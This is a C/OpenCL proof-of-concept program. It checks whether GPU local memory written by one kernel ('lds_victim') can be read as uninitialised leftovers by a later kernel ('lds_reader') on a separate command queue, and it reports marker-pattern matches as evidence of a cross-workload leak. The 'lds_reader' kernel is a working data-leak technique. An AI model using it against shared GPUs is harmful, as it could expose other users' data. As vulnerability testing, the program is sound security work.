#define CL_TARGET_OPENCL_VERSION 300
#include <CL/cl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#define LDS_WORDS 8192u
#define LOCAL_SIZE 256u
#define MAGIC 0xA5C30000u

static const char *src =
"__kernel void lds_victim(__global uint *sink)\n"
"{\n"
"    volatile __local uint scratch[8192];\n"
"    uint lid = (uint)get_local_id(0);\n"
"    uint lsize = (uint)get_local_size(0);\n"
"    for (uint i = lid; i < 8192; i += lsize)\n"
"        scratch[i] = 0xA5C30000u ^ i;\n"
"    barrier(CLK_LOCAL_MEM_FENCE);\n"
"    uint idx = (lid * 131u + 17u) & 8191u;\n"
"    sink[get_global_id(0)] = scratch[idx];\n"
"}\n"
"\n"
"__kernel void lds_reader(__global uint *out)\n"
"{\n"
"    volatile __local uint scratch[8192];\n"
"    uint lid = (uint)get_local_id(0);\n"
"    uint lsize = (uint)get_local_size(0);\n"
"    uint group = (uint)get_group_id(0);\n"
"    for (uint i = lid; i < 8192; i += lsize)\n"
"        out[group * 8192u + i] = scratch[i];\n"
"}\n";

int main(void)
{
    setbuf(stdout, NULL);

    cl_int err;
    cl_uint np = 0;
    cl_platform_id platform = NULL;
    cl_device_id dev = NULL;
    cl_context ctx = NULL;
    cl_command_queue qA = NULL, qB = NULL;
    cl_program prog = NULL;
    cl_kernel victim = NULL;
    cl_kernel reader = NULL;
    cl_mem sink = NULL;
    cl_mem outbuf = NULL;
    uint32_t *out = NULL;

    err = clGetPlatformIDs(0, NULL, &np);
    printf("clGetPlatformIDs=%d platforms=%u\n", err, np);
    if (err != CL_SUCCESS || np == 0) return 2;

    err = clGetPlatformIDs(1, &platform, NULL);
    if (err != CL_SUCCESS) return 3;

    err = clGetDeviceIDs(platform, CL_DEVICE_TYPE_ALL, 1, &dev, NULL);
    printf("clGetDeviceIDs=%d\n", err);
    if (err != CL_SUCCESS) return 4;

    char name[256] = {0};
    cl_uint cus = 0;
    cl_ulong local_mem = 0;

    clGetDeviceInfo(dev, CL_DEVICE_NAME, sizeof(name), name, NULL);
    clGetDeviceInfo(dev, CL_DEVICE_MAX_COMPUTE_UNITS, sizeof(cus), &cus, NULL);
    clGetDeviceInfo(dev, CL_DEVICE_LOCAL_MEM_SIZE,
                    sizeof(local_mem), &local_mem, NULL);

    printf("device=%s\n", name);
    printf("compute_units=%u\n", cus);
    printf("local_mem=%llu\n", (unsigned long long)local_mem);

    ctx = clCreateContext(NULL, 1, &dev, NULL, NULL, &err);
    printf("clCreateContext=%d\n", err);
    if (!ctx || err != CL_SUCCESS) return 5;

    qA = clCreateCommandQueueWithProperties(ctx, dev, NULL, &err);
    printf("clCreateCommandQueueWithProperties(qA)=%d\n", err);
    if (!qA || err != CL_SUCCESS) return 6;

    qB = clCreateCommandQueueWithProperties(ctx, dev, NULL, &err);
    printf("clCreateCommandQueueWithProperties(qB)=%d\n", err);
    if (!qB || err != CL_SUCCESS) return 6;

    prog = clCreateProgramWithSource(ctx, 1, &src, NULL, &err);
    printf("clCreateProgramWithSource=%d\n", err);
    if (!prog || err != CL_SUCCESS) return 7;

    err = clBuildProgram(prog, 1, &dev, "-cl-opt-disable", NULL, NULL);
    printf("clBuildProgram=%d\n", err);
    if (err != CL_SUCCESS) {
        size_t n = 0;
        clGetProgramBuildInfo(prog, dev, CL_PROGRAM_BUILD_LOG, 0, NULL, &n);
        char *log = calloc(1, n + 1);
        if (log) {
            clGetProgramBuildInfo(prog, dev, CL_PROGRAM_BUILD_LOG, n, log, NULL);
            printf("BUILD_LOG:\n%s\n", log);
            free(log);
        }
        return 8;
    }

    victim = clCreateKernel(prog, "lds_victim", &err);
    printf("clCreateKernel(victim)=%d\n", err);
    if (!victim || err != CL_SUCCESS) return 9;

    reader = clCreateKernel(prog, "lds_reader", &err);
    printf("clCreateKernel(reader)=%d\n", err);
    if (!reader || err != CL_SUCCESS) return 10;

    cl_ulong victim_local = 0;
    cl_ulong reader_local = 0;

    clGetKernelWorkGroupInfo(victim, dev, CL_KERNEL_LOCAL_MEM_SIZE,
                             sizeof(victim_local), &victim_local, NULL);
    clGetKernelWorkGroupInfo(reader, dev, CL_KERNEL_LOCAL_MEM_SIZE,
                             sizeof(reader_local), &reader_local, NULL);

    printf("victim_local_mem=%llu\n",
           (unsigned long long)victim_local);
    printf("reader_local_mem=%llu\n",
           (unsigned long long)reader_local);

    size_t groups = cus ? (size_t)cus * 16u : 64u;
    size_t global = groups * LOCAL_SIZE;
    size_t local = LOCAL_SIZE;

    sink = clCreateBuffer(ctx, CL_MEM_WRITE_ONLY,
                          global * sizeof(uint32_t), NULL, &err);
    printf("clCreateBuffer(sink)=%d\n", err);
    if (!sink || err != CL_SUCCESS) return 11;

    size_t words = groups * LDS_WORDS;
    size_t bytes = words * sizeof(uint32_t);

    out = calloc(words, sizeof(uint32_t));
    if (!out) return 12;

    outbuf = clCreateBuffer(ctx, CL_MEM_WRITE_ONLY, bytes, NULL, &err);
    printf("clCreateBuffer(out)=%d bytes=%zu groups=%zu\n",
           err, bytes, groups);
    if (!outbuf || err != CL_SUCCESS) return 13;

    err = clSetKernelArg(victim, 0, sizeof(sink), &sink);
    if (err != CL_SUCCESS) return 14;

    err = clSetKernelArg(reader, 0, sizeof(outbuf), &outbuf);
    if (err != CL_SUCCESS) return 15;

    err = clEnqueueNDRangeKernel(qA, victim, 1, NULL,
                                 &global, &local, 0, NULL, NULL);
    printf("clEnqueueNDRangeKernel(victim)=%d\n", err);
    if (err != CL_SUCCESS) return 16;

    err = clFinish(qA);
    printf("clFinish(victim)=%d\n", err);
    if (err != CL_SUCCESS) return 17;

    err = clEnqueueNDRangeKernel(qB, reader, 1, NULL,
                                 &global, &local, 0, NULL, NULL);
    printf("clEnqueueNDRangeKernel(reader)=%d\n", err);
    if (err != CL_SUCCESS) return 18;

    err = clEnqueueReadBuffer(qB, outbuf, CL_TRUE, 0,
                              bytes, out, 0, NULL, NULL);
    printf("clEnqueueReadBuffer=%d\n", err);
    if (err != CL_SUCCESS) return 19;

    size_t exact_matches = 0;
    size_t range_matches = 0;
    size_t longest_exact_run = 0;
    size_t printed = 0;

    for (size_t g = 0; g < groups; g++) {
        size_t run = 0;

        for (size_t i = 0; i < LDS_WORDS; i++) {
            uint32_t v = out[g * LDS_WORDS + i];
            uint32_t expected = MAGIC ^ (uint32_t)i;

            if (v >= MAGIC && v < MAGIC + LDS_WORDS)
                range_matches++;

            if (v == expected) {
                exact_matches++;
                run++;

                if (printed < 16) {
                    printf("exact_hit group=%zu index=%zu value=0x%08x\n",
                           g, i, v);
                    printed++;
                }

                if (run > longest_exact_run)
                    longest_exact_run = run;
            } else {
                run = 0;
            }
        }
    }

    printf("samples=%zu\n", words);
    printf("exact_matches=%zu\n", exact_matches);
    printf("range_matches=%zu\n", range_matches);
    printf("longest_exact_run=%zu\n", longest_exact_run);

    if (exact_matches > 0)
        printf("SEC2-DUAL-QUEUE=OBSERVED\n");
    else
        printf("SEC2-DUAL-QUEUE=NO_EXACT_MATCH\n");

    clReleaseMemObject(outbuf);
    clReleaseMemObject(sink);
    clReleaseKernel(reader);
    clReleaseKernel(victim);
    clReleaseProgram(prog);
    clReleaseCommandQueue(qB);
    clReleaseCommandQueue(qA);
    clReleaseContext(ctx);
    free(out);

    return 0;
}
